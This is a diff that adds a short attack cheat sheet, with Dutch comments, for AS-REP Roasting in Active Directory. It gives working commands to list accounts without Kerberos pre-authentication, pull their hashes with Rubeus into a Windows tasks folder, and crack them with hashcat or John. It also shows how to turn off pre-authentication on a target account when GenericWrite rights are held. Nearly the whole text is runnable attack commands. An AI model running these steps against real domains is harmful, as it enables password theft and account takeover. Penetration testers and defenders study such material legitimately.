@@ -1,0 +1,15 @@
+# AS-REP Roasting - Accounts zonder Kerberos pre-auth
+# Stap 1: Vind accounts zonder pre-auth vereiste
+powershell -c "Import-Module .\PowerView.ps1; Get-DomainUser -PreauthNotRequired | select samaccountname,distinguishedname"
+# Of met AD Module:
+Get-ADUser -Filter {DoesNotRequirePreAuth -eq $true} -Properties DoesNotRequirePreAuth
+# Stap 2: AS-REP hashes ophalen met Rubeus
+.\Rubeus.exe asreproast /format:hashcat /outfile:C:\Windows\tasks\asrep_hashes.txt
+# Alleen specifieke user:
+.\Rubeus.exe asreproast /user:targetuser /format:hashcat /outfile:C:\Windows\tasks\asrep_hashes.txt
+# Stap 3: Crack met hashcat (mode 18200)
+hashcat -m 18200 asrep_hashes.txt wordlist.txt --rules-file best64.rule
+# Of met John:
+john --wordlist=wordlist.txt asrep_hashes.txt
+# Targeted: Als je GenericWrite hebt, disable pre-auth zelf:
+Set-DomainObject -Identity targetuser -XOR @{useraccountcontrol=4194304} -Verbose
